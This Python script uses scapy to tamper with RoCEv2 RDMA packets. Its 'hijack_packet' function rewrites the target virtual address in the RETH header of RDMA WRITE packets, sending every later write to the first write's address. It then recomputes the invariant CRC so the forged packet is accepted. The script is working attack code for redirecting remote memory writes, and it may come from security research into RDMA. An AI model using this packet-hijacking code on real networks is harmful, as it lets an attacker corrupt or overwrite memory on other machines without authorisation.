#!/usr/bin/python

import os, sys, binascii, zlib
from scapy.all import *

# Based on IB spec vol1 7.8.1 Invariant CRC and RoCEv2 annex A17.3.3 ICRC for RoCEv2 packets.
def rocev2_calc_icrc(p):
    # For RoCEv2:
    #   IPv4: TTL, header checksum, and Type of Service (DSCP and ECN)
    #   UDP: checksum
    #   BTH: Resv8a, byte 4 (counting from 0) of BTH header
    p[IP].ttl = 0xff
    p[IP].chksum = 0xffff
    p[IP].tos = 0xff
    p[UDP].chksum = 0xffff
    payload = bytearray(raw(p[UDP].payload))
    payload[4] = chr(0xff)
    p[UDP].payload = Packet(str(payload))
    # CRC input includes 64 bits of '1's, and runs from IP header to the byte before ICRC
    crc_input = chr(0xff) * 8 + raw(p[IP])[:-4]
    print >> sys.stderr, "crc_input:", binascii.hexlify(crc_input)
    return struct.pack('<i', zlib.crc32(crc_input))

LEN_BTH_HEADER = 12
LEN_RETH_HEADER = 16
LEN_RETH_VA = 8
LEN_RETH_RKEY = 4
LEN_RETH_DMALEN = 4

# RC RDMA Writes with ERTH header present, which includes write virtual address
BTH_OPCODE_RDMA_WRITE_FIRST = 0b00000110
BTH_OPCODE_RDMA_WRITE_ONLY = 0b00001010
BTH_OPCODE_RDMA_WRITE_ONLY_WITH_IMM = 0b00001011

# Transform the packet as necessary
def hijack_packet(p):
    print >> sys.stderr, "raw packet:", binascii.hexlify(bytearray(raw(p)))
    # Hijack write address
    payload = raw(p[UDP].payload)
    bth_header = payload[:LEN_BTH_HEADER]
    opcode = ord(bth_header[0])
    print >> sys.stderr, "opcode:", opcode
    if not(opcode == BTH_OPCODE_RDMA_WRITE_FIRST or \
        opcode == BTH_OPCODE_RDMA_WRITE_ONLY or \
        opcode == BTH_OPCODE_RDMA_WRITE_ONLY_WITH_IMM):
        return p
    reth_header = payload[LEN_BTH_HEADER:][:LEN_RETH_HEADER]
    VA = reth_header[:LEN_RETH_VA]
    print >> sys.stderr, "VA:", binascii.hexlify(VA)
    print >> sys.stderr, "payload before:", binascii.hexlify(bytearray(payload))
    payload_bytearray = bytearray(payload)
    if hijack_packet.first_write_addr is None:
        hijack_packet.first_write_addr = VA
    else:
        VA = hijack_packet.first_write_addr
        va_start = LEN_BTH_HEADER
        va_end = va_start + LEN_RETH_VA
        payload_bytearray[va_start:va_end] = VA
    # Fix ICRC
    p[UDP].payload = Packet(str(payload_bytearray))
    print "Before ICRC", p.show()
    icrc = rocev2_calc_icrc(p.copy())
    print "After ICRC", p.show()
    print >> sys.stderr, p[IP].chksum   # _debug_
    payload_bytearray[-4:] = icrc
    p[UDP].payload = Packet(str(payload_bytearray))
    print >> sys.stderr, "payload after:", binascii.hexlify(bytearray(raw(p[UDP].payload)))
    return p

hijack_packet.first_write_addr = None

